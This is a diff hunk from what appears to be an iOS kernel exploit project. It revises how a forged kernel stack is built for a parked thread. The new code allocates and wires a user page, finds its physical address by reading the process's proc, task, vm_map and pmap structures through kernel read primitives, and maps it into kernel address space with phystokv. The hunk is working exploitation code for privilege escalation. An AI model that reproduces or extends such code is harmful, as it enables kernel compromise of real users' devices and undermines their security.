@@ -3697,26 +3697,35 @@ static void *kpKcParkWorker(void *arg)
         (unsigned long long)qC0, (unsigned long long)q100, (unsigned long long)q140,
         (unsigned long long)q180, (unsigned long long)q3E8]);
 
-    // 2.0.161: SP — kstackptr is 0 on a parked userspace thread. Use a
-    // sacrificial 0x21 page as fake kernel stack (top-0x400).
+    // 2.0.162: SP — kstackptr=0 on parked thread. Full-phys scan (2.0.161)
+    // crashed the app. Use E11-style wired page + phystokv as fake kernel stack.
     uint64_t sp = q140 ? (kp_untag_ptr(q140) - 0x400) : 0;
     if (!sp) {
-        uint64_t pB = kconstant(physBase), pS = kconstant(physSize);
-        for (uint64_t pa = pB; pa < pB + pS; pa += 0x4000) {
-            if (kpFrameTypeOf(pa) != 0x21) continue;
-            uint64_t al = phystokv(pa);
-            if (!al) continue;
-            int looksPte = 0;
-            for (uint32_t o = 0; o < 0x40; o += 8) {
-                if ((early_kread64(al + o) & 3) == 3) looksPte++;
-            }
-            if (looksPte >= 4) continue;
-            sp = (al + 0x4000 - 0x400) & ~0xFULL;
-            bc([NSString stringWithFormat:@"  SP fallback heap page=%#llx sp=%#llx", (unsigned long long)al, (unsigned long long)sp]);
-            break;
+        static uint8_t *kcStackPage = NULL;
+        if (!kcStackPage && posix_memalign((void **)&kcStackPage, 0x4000, 0x4000) == 0) {
+            memset(kcStackPage, 0, 0x4000);
+            (void)mlock(kcStackPage, 0x4000);
         }
+        if (!kcStackPage) { gKcStop = 1; pthread_detach(wpt); bc(@"FAIL: stack page"); return r; }
+        // PA via our pmap (same as E11 forge).
+        uint64_t task = 0, map = 0, pmap = 0, ttep = 0;
+        uint64_t ro = kp_untag_ptr(early_kread64([self findProcByCommName:getprogname() log:r] + koffsetof(proc, proc_ro)));
+        // fallback: use selfProc already in rcIsTable path — resolve quickly
+        if (!kpLooksLikeKernelPointer(ro)) {
+            uint64_t selfProc2 = [self findProcByCommName:"KexProofV2" log:r];
+            ro = selfProc2 ? kp_untag_ptr(early_kread64(selfProc2 + koffsetof(proc, proc_ro))) : 0;
+        }
+        if (ro) task = kp_untag_ptr(early_kread64(ro + off_proc_ro_pr_task));
+        if (task) map = kp_untag_ptr(early_kread64(task + off_task_map));
+        if (map) pmap = kp_untag_ptr(early_kread64(map + koffsetof(vm_map, pmap)));
+        if (pmap) ttep = kp_untag_ptr(early_kread64(pmap + koffsetof(pmap, ttep)));
+        uint64_t pa = ttep ? vtophys(ttep, (uint64_t)kcStackPage) : 0;
+        uint64_t kva = (pa && gPrimitives.phystokv) ? gPrimitives.phystokv(pa) : 0;
+        bc([NSString stringWithFormat:@"  stack page user=%#llx pa=%#llx kva=%#llx",
+            (unsigned long long)kcStackPage, (unsigned long long)pa, (unsigned long long)kva]);
+        if (!kva) { gKcStop = 1; pthread_detach(wpt); bc(@"FAIL: stack kva"); return r; }
+        sp = (kva + 0x4000 - 0x400) & ~0xFULL;
     }
-    if (!sp) { gKcStop = 1; pthread_detach(wpt); bc(@"FAIL: no SP"); return r; }
 
     // Identity write-test on options (restore immediately).
     extern uint16_t kp_rc_kread16(uint64_t);
